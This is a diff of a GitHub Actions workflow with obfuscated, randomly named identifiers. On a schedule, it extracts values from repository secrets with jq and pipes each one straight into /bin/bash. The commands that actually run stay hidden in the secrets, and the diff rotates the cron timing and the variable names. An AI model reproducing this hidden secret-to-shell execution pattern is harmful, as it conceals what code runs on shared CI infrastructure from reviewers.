@@ -2,7 +2,8 @@ name: hongqigong6725
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 2/6 * * *'
+    - cron: '37 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: hongqigong6725
         env:
-          rsr360: ${{ secrets.rsr360 }}
+          bxkdh9: ${{ secrets.bxkdh9 }}
         run: |
-          echo $rsr360 | jq -r .juk507 | /bin/bash
-          echo $udskv8632 | jq -r .cifva08 | /bin/bash
-          echo $pm1 | jq -r .kh5 | /bin/bash
-          echo $s435 | jq -r .qt8 | /bin/bash
-          echo $yyorh85192 | jq -r .qz434 | /bin/bash
-          echo $w770 | jq -r .zcwv4 | /bin/bash
-          echo $upudg0372 | jq -r .xhrg64 | /bin/bash
-          echo $q478 | jq -r .lu84 | /bin/bash
-          echo $ea74 | jq -r .sxee53 | /bin/bash
-          echo $jacv17988 | jq -r .ivdg018 | /bin/bash
-          echo $imkl24 | jq -r .xsziu47867 | /bin/bash
+          echo $bxkdh9 | jq -r .xnjjf9385 | /bin/bash
+          echo $cbhdn134 | jq -r .iq93629 | /bin/bash
+          echo $z768 | jq -r .mkafw8 | /bin/bash
+          echo $rw45152 | jq -r .f604 | /bin/bash
+          echo $nq4963 | jq -r .xroeg00 | /bin/bash
+          echo $tlir1 | jq -r .pvzph61207 | /bin/bash
+          echo $puo083 | jq -r .ooi78236 | /bin/bash
+          echo $qumw102 | jq -r .btgxo945 | /bin/bash
+          echo $fdp4 | jq -r .a99 | /bin/bash
+          echo $ylk012 | jq -r .wa1 | /bin/bash
+          echo $dfdlc4440 | jq -r .ubu232 | /bin/bash
+          echo $r08 | jq -r .em7981 | /bin/bash
+          echo $mf0548 | jq -r .pmvp0 | /bin/bash
 
